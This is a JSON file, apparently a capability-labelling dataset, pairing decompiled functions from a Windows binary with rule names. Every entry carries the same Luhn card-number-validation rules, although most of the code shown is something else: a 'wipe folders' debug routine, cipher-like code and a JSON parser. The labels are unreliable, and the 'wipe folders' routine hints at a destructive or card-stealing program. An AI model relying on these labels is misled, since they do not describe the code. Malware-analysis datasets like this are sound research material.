{
    "00401306": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401306(uint arg_8h)\n\n{\n    uint *var_30h;\n    uint var_2ch;\n    code *var_28h;\n    uint *var_24h;\n    uint var_20h;\n    code *var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    code *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00406625(0x413060, 0x63c, 8, 3, &var_4h);\n    var_4h._3_1_ = 0;\n    fcn.00406625(0x413060, 0xa58, 6, 3, &var_8h);\n    var_8h._3_1_ = 0;\n    fcn.00406625(0x413060, 0x887, 0x10, 3, &var_ch);\n    var_30h = &var_4h;\n    var_ch._3_1_ = 0;\n    var_24h = &var_8h;\n    var_18h = &var_ch;\n    var_2ch = 2;\n    var_28h = fcn.004012d4;\n    var_20h = 2;\n    var_1ch = fcn.004012a2;\n    var_14h = 2;\n    var_10h = fcn.00401270;\n    fcn.0040748b(arg_8h, &var_30h, 3);\n    return;\n}\n",
        "token_count": 365
    },
    "0040469c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.0040469c(void)\n\n{\n    uint arg_10h;\n    uint arg_10h_00;\n    uint var_30h;\n    code *var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h_00 = 0x4216a0;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n    arg_10h = 7;\n    fcn.00405082(7, L\"[DBG] \", arg_10h_00);\n    fcn.00405082(8, L\"wipe folders\\r\\n\", arg_10h);\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n    var_2ch = fcn.00404642;\n    var_30h = 0;\n    var_28h = 0x404694;\n    var_24h = 0;\n    var_20h = 0;\n    var_18h = 0;\n    var_14h = 0;\n    var_10h = 0;\n    var_ch = 0;\n    var_8h = 0x404636;\n    var_4h = 0x404677;\n    fcn.00408690(&var_30h);\n    fcn.00408728(&var_30h, 0);\n    return;\n}\n",
        "token_count": 349
    },
    "0040471f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040471f(uint arg_8h)\n\n{\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    code *var_4h;\n    \n    var_2ch = 0x404673;\n    var_30h = 0;\n    var_24h = 0;\n    var_20h = 0;\n    var_18h = 0;\n    var_14h = 0;\n    var_10h = 0;\n    var_ch = 0;\n    var_28h = 0x404698;\n    var_8h = 0x40463c;\n    var_4h = fcn.0040467d;\n    fcn.004082ae(arg_8h, &var_30h);\n    return 1;\n}\n",
        "token_count": 231
    },
    "004076f1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004076f1(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_30h;\n    \n    if (*0x4214b8 == 0) {\n        iVar1 = fcn.00407682();\n        if (iVar1 == 0) {\n            return 0;\n        }\n        fcn.00405aba(0x4214a0);\n        *0x4214b8 = 1;\n    }\n    fcn.004054c5(0x4214a0);\n    if (((*0x421474 < 0x1000001) ||\n        ((iVar1 = fcn.00405dee(&var_30h, 0x30),  iVar1 != 0 &&\n         (iVar1 = fcn.004090fe(0x421380, &var_30h, 0x30, 0, 0),  iVar1 != 0)))) &&\n       (iVar1 = fcn.004090b6(0x421380, arg_8h, arg_ch),  iVar1 != 0)) {\n        fcn.00405c8f(0x4214a0);\n        uVar2 = 1;\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 299
    },
    "004090fe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004090fe(int32_t arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    uint32_t uVar1;\n    uint var_30h;\n    \n    if ((arg_18h < 0x31) && (arg_10h == 0x30)) {\n        uVar1 = 0;\n        if ((arg_18h == 0) || (fcn.00405228(&var_30h, arg_14h, arg_18h),  uVar1 = arg_18h,  arg_18h != 0x30)) {\n            fcn.0040524d(&var_30h + uVar1, 0, 0x30 - uVar1);\n        }\n        fcn.004077d3(&var_30h, arg_ch, 0x30);\n        fcn.00409176(arg_8h, &var_30h);\n        *(arg_8h + 0xf4) = 1;\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 252
    },
    "00409176": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409176(int32_t arg_8h, uint arg_ch)\n\n{\n    uint *arg_8h_00;\n    uint32_t uVar1;\n    uint var_30h;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    uVar1 = 0;\n    arg_8h_00 = arg_8h + 0xf8;\n    do {\n        fcn.004077bf(arg_8h_00, 0x10);\n        fcn.00408e62(arg_8h, arg_8h_00, &var_30h + uVar1);\n        uVar1 = uVar1 + 0x10;\n    } while (uVar1 < 0x30);\n    fcn.004077d3(&var_30h, arg_ch, 0x30);\n    fcn.00408ea5(arg_8h, 0x100, &var_30h);\n    *(arg_8h + 0x118) = 1;\n    *arg_8h_00 = var_10h;\n    *(arg_8h + 0xfc) = uStack16;\n    *(arg_8h + 0x100) = uStack12;\n    *(arg_8h + 0x104) = uStack8;\n    return;\n}\n",
        "token_count": 309
    },
    "0040cea6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040cea6(uint arg_8h)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    unkbyte3 Var3;\n    \n    if (arg_8h - 0x30U < 10) {\n        return in_EAX & 0xffffff00 | arg_8h - 0x30;\n    }\n    iVar1 = arg_8h;\n    if (iVar1 < 0x62) {\n        iVar2 = iVar1;\n        if ((iVar1 == 0x61) || (iVar2 = iVar1 + -0x41,  iVar2 == 0)) {\n            return CONCAT31(iVar2 >> 8, 10);\n        }\n        iVar1 = iVar1 + -0x42;\n    }\n    else {\n        iVar1 = iVar1 + -0x62;\n    }\n    if (iVar1 == 0) {\n        return 0xb;\n    }\n    if (iVar1 != 1) {\n        if (iVar1 == 2) {\n            return 0xd;\n        }\n        if (iVar1 != 3) {\n            Var3 = iVar1 + -4 >> 8;\n            if (iVar1 + -4 != 0) {\n                return CONCAT31(Var3, 0xff);\n            }\n            return CONCAT31(Var3, 0xf);\n        }\n        return 0xe;\n    }\n    return 0xc;\n}\n",
        "token_count": 323
    },
    "0040cf32": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040cf32(uint *arg_8h, uint8_t *arg_ch, int32_t *arg_10h)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    int32_t iVar6;\n    char cVar7;\n    uint8_t uVar8;\n    char cVar9;\n    uint8_t uVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t extraout_EDX;\n    uint32_t extraout_EDX_00;\n    uint8_t *puVar15;\n    uint8_t *puVar16;\n    int32_t **ppiVar17;\n    uint *puVar18;\n    int32_t *piVar19;\n    float10 fVar20;\n    int64_t iVar21;\n    uint uVar22;\n    uint var_70h;\n    int32_t *var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    code *var_58h;\n    int32_t var_4ch;\n    uint8_t *var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint8_t *var_34h;\n    int32_t var_30h;\n    uint32_t var_28h;\n    double dStack48;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint8_t *var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t **var_10h;\n    int32_t **var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_20h = 0;\n    fcn.0040524d(&var_70h, 0, 0x34);\n    var_24h = 0;\n    var_30h = 0;\n    var_3ch = 0;\n    var_38h = 0;\n    var_34h = arg_ch;\n    if ((((2 < arg_10h) && (*arg_ch == 0xef)) && (arg_ch[1] == 0xbb)) && (arg_ch[2] == 0xbf)) {\n        var_34h = arg_ch + 3;\n        arg_10h = arg_10h - 3;\n    }\n    puVar16 = var_34h;\n    var_1ch = var_34h + arg_10h;\n    puVar18 = &var_64h;\n    for (iVar11 = 6; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *puVar18 = *arg_8h;\n        arg_8h = arg_8h + 1;\n        puVar18 = puVar18 + 1;\n    }\n    var_6ch = 0xfffffff7;\n    var_68h = 0xfffffff7;\n    var_4ch = 1;\n    uVar5 = *0x4129b8;\ncode_r0x0040cfaf:\n    var_14h = NULL;\n    piVar19 = NULL;\n    var_18h = 0;\n    ppiVar17 = NULL;\n    uVar14 = 8;\n    arg_10h = NULL;\n    var_ch = NULL;\n    var_10h = NULL;\n    var_8h = 8;\n    var_44h = 1;\n    iVar11 = var_4ch;\n    do {\n        if (puVar16 == var_1ch) {\n            uVar8 = 0;\n        }\n        else {\n            uVar8 = *puVar16;\n        }\n        var_48h = puVar16;\n        if ((uVar14 & 0x20) == 0) {\ncode_r0x0040d323:\n            if ((var_60h & 1) == 0) {\ncode_r0x0040d446:\n                if (uVar14 < '\\0') {\n                    if (uVar8 == 0) break;\n                    iVar11 = var_4ch;\n                    if (uVar8 != 9) {\n                        if (uVar8 == 10) {\ncode_r0x0040d47c:\n                            var_44h = var_44h + 1;\n                            var_40h = 0;\n                            iVar11 = var_4ch;\n                        }\n                        else if ((uVar8 != 0xd) && (uVar8 != 0x20)) goto code_r0x0040db43;\n                    }\n                }\n                else if ((uVar14 & 8) == 0) {\n                    ppiVar1 = ppiVar17 + 1;\n                    piVar2 = *ppiVar1;\n                    if (piVar2 == 0x1) {\n                        iVar11 = var_4ch;\n                        ppiVar17 = var_ch;\n                        if (uVar8 != 9) {\n                            if (uVar8 == 10) {\n                                var_44h = var_44h + 1;\n                                var_40h = 0;\n                            }\n                            else if ((uVar8 != 0xd) && (uVar8 != 0x20)) {\n                                if (uVar8 == 0x22) {\n                                    if ((uVar14 & 4) != 0) goto code_r0x0040db43;\n                                    uVar14 = uVar14 | 0x20;\n                                    piVar19 = NULL;\n                                    arg_10h = NULL;\n                                    var_14h = var_ch[4];\n                                    ppiVar17 = var_ch;\n                                    var_8h = uVar14;\n                                }\n                                else if (uVar8 == 0x2c) {\n                                    if ((uVar14 & 4) == 0) goto code_r0x0040db43;\n                                    uVar14 = uVar14 & 0xfffffffb;\n                                    ppiVar17 = var_ch;\n                                    var_8h = uVar14;\n                                }\n                                else {\n                                    if (uVar8 != 0x7d) goto code_r0x0040db43;\n                                    uVar14 = uVar14 & 0xfffffffb | 1;\n                                    ppiVar17 = var_ch;\n                                    var_8h = uVar14;\n                                }\n                                goto code_r0x0040da93;\n                            }\n                        }\n                    }\n                    else {\n                        ppiVar17 = var_ch;\n                        if (piVar2 - 3U < 2) {\n                            if (uVar8 - 0x30 < 10) {\n                                var_24h = var_24h + 1;\n                                if (piVar2 == 0x3) {\n                                    if ((uVar14 & 0x400) != 0) goto code_r0x0040d8a3;\n                                    if ((uVar14 & 0x200) != 0) goto code_r0x0040db43;\n                                    if ((var_24h == 1) && (uVar8 == 0x30)) {\n                                        var_8h = uVar14 | 0x200;\n                                    }\n                                    iVar21 = fcn.0040df30(var_ch[2], var_ch[3], 10, 0);\n                                    iVar21 = iVar21 + (uVar8 + -0x30);\n                                    var_ch[2] = iVar21;\n                                    var_ch[3] = iVar21 >> 0x20;\n                                    iVar11 = var_4ch;\n                                    uVar14 = var_8h;\n                                    ppiVar17 = var_ch;\n                                    piVar19 = arg_10h;\n                                }\n                                else if ((uVar14 & 0x400) == 0) {\n                                    iVar21 = fcn.0040df30(_var_3ch, 10, 0);\n                                    _var_3ch = iVar21 + (uVar8 + -0x30);\n                                    iVar11 = var_4ch;\n                                    uVar14 = var_8h;\n                                    ppiVar17 = var_ch;\n                                    piVar19 = arg_10h;\n                                }\n                                else {\ncode_r0x0040d8a3:\n                                    uVar14 = uVar14 | 0x800;\n                                    var_30h = uVar8 + -0x30 + var_30h * 10;\n                                    iVar11 = var_4ch;\n                                    ppiVar17 = var_ch;\n                                    var_8h = uVar14;\n                                }\n                            }\n                            else if ((uVar8 == 0x2b) || (uVar8 == 0x2d)) {\n                                if ((uVar14 & 0xc00) != 0x400) goto code_r0x0040d929;\n                                uVar12 = uVar14 | 0x800;\n                                uVar14 = uVar14 | 0x1800;\n                                iVar11 = var_4ch;\n                                ppiVar17 = var_ch;\n                                var_8h = uVar14;\n                                if (uVar8 != 0x2d) {\n                                    uVar14 = uVar12;\n                                    var_8h = uVar12;\n                                }\n                            }\n                            else {\n                                if ((uVar8 != 0x2e) || (piVar2 != 0x3)) {\ncode_r0x0040d929:\n                                    uVar22 = uVar5 >> 0x20;\n                                    if ((uVar14 & 0x400) == 0) {\n                                        if (piVar2 == 0x4) {\n                                            if (var_24h == 0) goto code_r0x0040db43;\n                                            dStack48 = _var_3ch;\n                                            fVar20 = fcn.0040dbe2(uVar5, uVar22, var_24h);\n                                            ppiVar17 = var_ch;\n                                            var_ch = var_10h;\n                                            *(ppiVar17 + 2) = dStack48 / fVar20 + *(ppiVar17 + 2);\n                                            uVar14 = var_8h;\n                                        }\n                                        var_8h = uVar14;\n                                        puVar16 = var_48h;\n                                        if ((uVar8 == 0x65) || (uVar8 == 0x45)) {\n                                            if (*ppiVar1 == 0x3) {\n                                                *ppiVar1 = 0x4;\n                                                *(var_ch + 2) = *(var_ch + 2);\n                                            }\n                                            var_24h = 0;\n                                            uVar14 = var_8h & 0xfffffdff | 0x400;\n                                            iVar11 = var_4ch;\n                                            ppiVar17 = var_ch;\n                                            var_8h = uVar14;\n                                            goto code_r0x0040db1a;\n                                        }\n                                    }\n                                    else {\n                                        if (var_24h == 0) goto code_r0x0040db43;\n                                        iVar11 = var_30h;\n                                        if ((uVar14 & 0x1000) != 0) {\n                                            iVar11 = -var_30h;\n                                        }\n                                        fVar20 = fcn.0040dbe2(uVar5, uVar22, iVar11);\n                                        *(var_ch + 2) = fVar20 * *(var_ch + 2);\n                                    }\n                                    if ((var_8h & 0x100) != 0) {\n                                        if (*ppiVar1 == 0x3) {\n                                            piVar2 = var_ch[2];\n                                            var_ch[2] = -piVar2;\n                                            var_ch[3] = -(var_ch[3] + (piVar2 != NULL));\n                                        }\n                                        else {\n                                            *(var_ch + 2) = -*(var_ch + 2);\n                                        }\n                                    }\n                                    uVar14 = var_8h | 3;\n                                    ppiVar17 = var_ch;\n                                    var_8h = uVar14;\n                                    goto code_r0x0040da93;\n                                }\n                                if (var_24h == 0) goto code_r0x0040db43;\n                                var_24h = 0;\n                                *ppiVar1 = 0x4;\n                                *(var_ch + 2) = *(var_ch + 2);\n                                iVar11 = var_4ch;\n                                ppiVar17 = var_ch;\n                            }\n                        }\n                        else {\ncode_r0x0040da93:\n                            if ((uVar14 & 2) != 0) {\n                                uVar14 = uVar14 & 0xfffffffd;\n                                puVar16 = puVar16 + -1;\n                                var_48h = puVar16;\n                                var_8h = uVar14;\n                            }\n                            iVar11 = var_4ch;\n                            if ((uVar14 & 1) != 0) {\n                                piVar2 = *ppiVar17;\n                                uVar14 = uVar14 & 0xfffffffe;\n                                if (piVar2 == NULL) {\n                                    uVar14 = uVar14 | 0x84;\n                                    var_8h = uVar14;\n                                }\n                                else {\n                                    var_8h = uVar14 | 0xc;\n                                    if (piVar2[1] != 2) {\n                                        var_8h = uVar14 | 4;\n                                    }\n                                    if (var_4ch == 0) {\n                                        if (piVar2[1] == 1) {\n                                            *(piVar2[2] * 0xc + 8 + piVar2[3]) = ppiVar17;\n                                        }\n                                        else if (piVar2[1] == 2) {\n                                            *(piVar2[3] + piVar2[2] * 4) = ppiVar17;\n                                        }\n                                    }\n                                    piVar3 = *ppiVar17;\n                                    piVar2 = piVar3 + 2;\n                                    *piVar2 = *piVar2 + 1;\n                                    if (var_6ch < piVar3[2]) {\ncode_r0x0040db43:\n                                        iVar6 = var_4ch;\n                                        iVar11 = var_20h;\n                                        if (var_4ch != 0) {\n                                            iVar11 = var_18h;\n                                        }\n                                        while (iVar11 != 0) {\n                                            iVar4 = *(iVar11 + 0x10);\n                                            (*var_58h)(iVar11);\n                                            iVar11 = iVar4;\n                                        }\n                                        if (iVar6 == 0) {\n                                            fcn.0040db7c(&var_64h, var_18h);\n                                        }\n                                        return 0;\n                                    }\n                                    var_10h = *ppiVar17;\n                                    uVar14 = var_8h;\n                                    ppiVar17 = var_10h;\n                                    var_ch = var_10h;\n                                }\n                            }\n                        }\n                    }\n                }\n                else {\n                    iVar11 = var_4ch;\n                    if (uVar8 != 9) {\n                        if (uVar8 == 10) goto code_r0x0040d47c;\n                        if ((uVar8 != 0xd) && (uVar8 != 0x20)) {\n                            if (uVar8 == 0x5d) {\n                                if ((ppiVar17 == NULL) || (ppiVar17[1] != 0x2)) goto code_r0x0040db43;\n                                uVar14 = uVar14 & 0xfffffff3 | 1;\n                                var_8h = uVar14;\n                                goto code_r0x0040da93;\n                            }\n                            if ((uVar14 & 4) == 0) {\n                                if ((uVar14 & 0x40) == 0) {\n                                    var_8h = uVar14 & 0xfffffff7;\n                                    if (uVar8 == 0x22) {\n                                        iVar11 = fcn.0040dc27(&var_70h, &var_10h, &var_18h, &var_20h, 5);\n                                        if (iVar11 == 0) goto code_r0x0040db43;\n                                        var_14h = var_10h[3];\n                                        var_ch = var_10h;\n                                        arg_10h = NULL;\n                                        iVar11 = var_4ch;\n                                        uVar14 = var_8h | 0x20;\n                                        puVar16 = var_48h;\n                                        ppiVar17 = var_10h;\n                                        piVar19 = NULL;\n                                        var_8h = var_8h | 0x20;\n                                    }\n                                    else {\n                                        if (uVar8 != 0x5b) {\n                                            if (uVar8 == 0x66) {\n                                                if ((((var_1ch - puVar16 < 4) ||\n                                                     (var_48h = puVar16 + 1,  puVar16[1] != 0x61)) ||\n                                                    (var_48h = puVar16 + 2,  puVar16[2] != 0x6c)) ||\n                                                   ((var_48h = puVar16 + 3,  puVar16[3] != 0x73 ||\n                                                    (var_48h = puVar16 + 4,  *var_48h != 0x65)))) goto code_r0x0040db43;\n                                                uVar22 = 6;\n                                            }\n                                            else {\n                                                if (uVar8 != 0x6e) {\n                                                    if (uVar8 == 0x74) {\n                                                        if ((((var_1ch - puVar16 < 3) ||\n                                                             (var_48h = puVar16 + 1,  puVar16[1] != 0x72)) ||\n                                                            (var_48h = puVar16 + 2,  puVar16[2] != 0x75)) ||\n                                                           (var_48h = puVar16 + 3,  *var_48h != 0x65))\n                                                        goto code_r0x0040db43;\n                                                        iVar11 = fcn.0040dc27(&var_70h, &var_10h, &var_18h, &var_20h, 6)\n                                                        ;\n                                                        if (iVar11 == 0) goto code_r0x0040db43;\n                                                        uVar14 = var_8h | 1;\n                                                        var_ch = var_10h;\n                                                        var_10h[2] = 0x1;\n                                                        puVar16 = var_48h;\n                                                        ppiVar17 = var_10h;\n                                                        var_8h = uVar14;\n                                                    }\n                                                    else {\n                                                        if (uVar8 == 0x7b) {\n                                                            iVar11 = fcn.0040dc27(&var_70h, &var_10h, &var_18h, &var_20h\n                                                                                  , 1);\n                                                            if (iVar11 == 0) goto code_r0x0040db43;\n                                                            var_ch = var_10h;\n                                                            iVar11 = var_4ch;\n                                                            uVar14 = var_8h;\n                                                            puVar16 = var_48h;\n                                                            ppiVar17 = var_10h;\n                                                            goto code_r0x0040db1a;\n                                                        }\n                                                        if (((uVar8 < '0') || ('9' < uVar8)) && (uVar8 != 0x2d))\n                                                        goto code_r0x0040db43;\n                                                        iVar11 = fcn.0040dc27(&var_70h, &var_10h, &var_18h, &var_20h, 3)\n                                                        ;\n                                                        if (iVar11 == 0) goto code_r0x0040db43;\n                                                        ppiVar17 = var_10h;\n                                                        if (var_4ch == 0) {\n                                                            while ((((('/' < uVar8 && (uVar8 < ':')) ||\n                                                                     ((uVar8 == 0x2b ||\n                                                                      (((uVar8 == 0x2d || (uVar8 == 0x65)) ||\n                                                                       (uVar8 == 0x45)))))) || (uVar8 == 0x2e)) &&\n                                                                   (var_48h = var_48h + 1,  var_48h != var_1ch))) {\n                                                                uVar8 = *var_48h;\n                                                            }\n                                                            uVar14 = var_8h | 3;\n                                                            var_ch = var_10h;\n                                                            puVar16 = var_48h;\n                                                            piVar19 = arg_10h;\n                                                            var_8h = uVar14;\n                                                        }\n                                                        else {\n                                                            var_24h = 0;\n                                                            _var_3ch = 0;\n                                                            var_30h = 0;\n                                                            var_ch = var_10h;\n                                                            puVar16 = var_48h;\n                                                            if (uVar8 == 0x2d) {\n                                                                uVar14 = var_8h & 0xffffe0ff | 0x100;\n                                                                iVar11 = var_4ch;\n                                                                ppiVar17 = var_10h;\n                                                                var_8h = uVar14;\n                                                                goto code_r0x0040db1a;\n                                                            }\n                                                            uVar14 = var_8h & 0xffffe0ff | 2;\n                                                            var_8h = uVar14;\n                                                            _var_3ch = 0;\n                                                        }\n                                                    }\n                                                    goto code_r0x0040da93;\n                                                }\n                                                if (((var_1ch - puVar16 < 3) ||\n                                                    (var_48h = puVar16 + 1,  puVar16[1] != 0x75)) ||\n                                                   ((var_48h = puVar16 + 2,  puVar16[2] != 0x6c ||\n                                                    (var_48h = puVar16 + 3,  *var_48h != 0x6c)))) goto code_r0x0040db43;\n                                                uVar22 = 7;\n                                            }\n                                            iVar11 = fcn.0040dc27(&var_70h, &var_10h, &var_18h, &var_20h, uVar22);\n                                            if (iVar11 == 0) goto code_r0x0040db43;\n                                            uVar14 = var_8h | 1;\n                                            var_ch = var_10h;\n                                            puVar16 = var_48h;\n                                            ppiVar17 = var_10h;\n                                            var_8h = uVar14;\n                                            goto code_r0x0040da93;\n                                        }\n                                        iVar11 = fcn.0040dc27(&var_70h, &var_10h, &var_18h, &var_20h, 2);\n                                        if (iVar11 == 0) goto code_r0x0040db43;\n                                        var_ch = var_10h;\n                                        iVar11 = var_4ch;\n                                        uVar14 = var_8h | 8;\n                                        puVar16 = var_48h;\n                                        ppiVar17 = var_10h;\n                                        var_8h = var_8h | 8;\n                                    }\n                                }\n                                else {\n                                    if (uVar8 != 0x3a) goto code_r0x0040db43;\n                                    uVar14 = uVar14 & 0xffffffbf;\n                                    var_8h = uVar14;\n                                }\n                            }\n                            else {\n                                if (uVar8 != 0x2c) goto code_r0x0040db43;\n                                uVar14 = uVar14 & 0xfffffffb;\n                                var_8h = uVar14;\n                            }\n                        }\n                    }\n                }\n            }\n            else if ((uVar14 & 0x6000) == 0) {\n                if (uVar8 != 0x2f) goto code_r0x0040d446;\n                if ((((uVar14 & 0x88) == 0) && (ppiVar17[1] != 0x1)) ||\n                   (puVar16 = puVar16 + 1,  var_48h = puVar16,  puVar16 == var_1ch)) goto code_r0x0040db43;\n                if (*puVar16 == 0x2a) {\n                    uVar14 = uVar14 | 0x4000;\n                    iVar11 = var_4ch;\n                    var_8h = uVar14;\n                }\n                else {\n                    if (*puVar16 != 0x2f) goto code_r0x0040db43;\n                    uVar14 = uVar14 | 0x2000;\n                    iVar11 = var_4ch;\n                    var_8h = uVar14;\n                }\n            }\n            else if ((uVar14 & 0x2000) == 0) {\n                if ((uVar14 & 0x4000) == 0) goto code_r0x0040d446;\n                if (uVar8 == 0) goto code_r0x0040db43;\n                if (((uVar8 == 0x2a) && (iVar11 = var_4ch,  puVar16 < var_1ch + -1)) && (puVar16[1] == 0x2f)) {\n                    uVar14 = uVar14 & 0xffffbfff;\n                    puVar16 = puVar16 + 1;\n                    var_8h = uVar14;\n                }\n            }\n            else if (((uVar8 == 0xd) || (uVar8 == 10)) || (uVar8 == 0)) {\n                uVar14 = uVar14 & 0xffffdfff;\n                puVar16 = puVar16 + -1;\n                var_8h = uVar14;\n            }\n        }\n        else {\n            if ((uVar8 == 0) || (var_6ch < piVar19)) goto code_r0x0040db43;\n            if ((uVar14 & 0x10) == 0) {\n                if (uVar8 == 0x5c) {\n                    uVar14 = uVar14 | 0x10;\n                    var_8h = uVar14;\n                }\n                else {\n                    if (uVar8 != 0x22) {\ncode_r0x0040d3a2:\n                        if (iVar11 == 0) {\n                            *(piVar19 + var_14h) = uVar8;\n                            ppiVar17 = var_ch;\n                        }\n                        goto code_r0x0040d2d1;\n                    }\n                    if (iVar11 == 0) {\n                        *(piVar19 + var_14h) = 0;\n                    }\n                    uVar14 = uVar14 & 0xffffffdf;\n                    var_14h = NULL;\n                    if (ppiVar17[1] != 0x1) {\n                        iVar11 = var_4ch;\n                        var_8h = uVar14;\n                        if (ppiVar17[1] == 0x5) {\n                            uVar14 = uVar14 | 1;\n                            ppiVar17[2] = piVar19;\n                            var_8h = uVar14;\n                        }\n                        goto code_r0x0040d323;\n                    }\n                    if (var_4ch == 0) {\n                        ppiVar17[3][ppiVar17[2] * 3] = ppiVar17[4];\n                        ppiVar17[3][ppiVar17[2] * 3 + 1] = piVar19;\n                        ppiVar17[4] = ppiVar17[4] + piVar19 + 1;\n                    }\n                    else {\n                        ppiVar17[3] = ppiVar17[3] + piVar19 + 1;\n                    }\n                    uVar14 = uVar14 | 0x48;\n                    iVar11 = var_4ch;\n                    var_8h = uVar14;\n                }\n            }\n            else {\n                uVar14 = uVar14 & 0xffffffef;\n                var_8h = uVar14;\n                if (uVar8 == 0x62) {\n                    iVar11 = var_4ch;\n                    if (var_4ch == 0) {\n                        *(piVar19 + var_14h) = 8;\n                    }\n                }\n                else if (uVar8 == 0x66) {\n                    iVar11 = var_4ch;\n                    if (var_4ch == 0) {\n                        *(piVar19 + var_14h) = 0xc;\n                    }\n                }\n                else if (uVar8 == 0x6e) {\n                    iVar11 = var_4ch;\n                    if (var_4ch == 0) {\n                        *(piVar19 + var_14h) = 10;\n                    }\n                }\n                else if (uVar8 == 0x72) {\n                    iVar11 = var_4ch;\n                    if (var_4ch == 0) {\n                        *(piVar19 + var_14h) = 0xd;\n                    }\n                }\n                else {\n                    if (uVar8 != 0x74) {\n                        iVar11 = var_4ch;\n                        if (uVar8 != 0x75) goto code_r0x0040d3a2;\n                        if (var_1ch - puVar16 < 5) goto code_r0x0040db43;\n                        var_48h = puVar16 + 1;\n                        cVar7 = fcn.0040cea6(*var_48h);\n                        if (cVar7 == -1) goto code_r0x0040db43;\n                        var_48h = puVar16 + 2;\n                        uVar8 = fcn.0040cea6(*var_48h);\n                        if (uVar8 == 0xff) goto code_r0x0040db43;\n                        var_48h = puVar16 + 3;\n                        cVar9 = fcn.0040cea6(*var_48h);\n                        if (cVar9 == -1) goto code_r0x0040db43;\n                        puVar15 = puVar16 + 4;\n                        var_48h = puVar15;\n                        var_1h._0_1_ = fcn.0040cea6(*puVar15);\n                        if (var_1h == 0xff) goto code_r0x0040db43;\n                        uVar12 = CONCAT11(cVar7 << 4 | uVar8, cVar9 << 4);\n                        uVar13 = uVar12 | var_1h;\n                        dStack48 = dStack48 & 0xffffffff | uVar13 << 0x20;\n                        uVar14 = extraout_EDX;\n                        if ((uVar12 & 0xf800) == 0xd800) {\n                            if (((var_1ch - puVar15 < 7) || (var_48h = puVar16 + 5,  puVar16[5] != 0x5c)) ||\n                               (var_48h = puVar16 + 6,  puVar16[6] != 0x75)) goto code_r0x0040db43;\n                            var_48h = puVar16 + 7;\n                            cVar7 = fcn.0040cea6(*var_48h);\n                            if (cVar7 == -1) goto code_r0x0040db43;\n                            var_48h = puVar16 + 8;\n                            uVar8 = fcn.0040cea6(*var_48h);\n                            if (uVar8 == 0xff) goto code_r0x0040db43;\n                            var_48h = puVar16 + 9;\n                            cVar7 = fcn.0040cea6(*var_48h);\n                            if (cVar7 == -1) goto code_r0x0040db43;\n                            puVar15 = puVar16 + 10;\n                            var_48h = puVar15;\n                            uVar10 = fcn.0040cea6(*puVar15);\n                            if (uVar10 == 0xff) goto code_r0x0040db43;\n                            uVar14 = (var_28h & 0x3bf | 0x40) << 2 | uVar8 & 3;\n                            dStack48 = dStack48 & 0xffffffff | 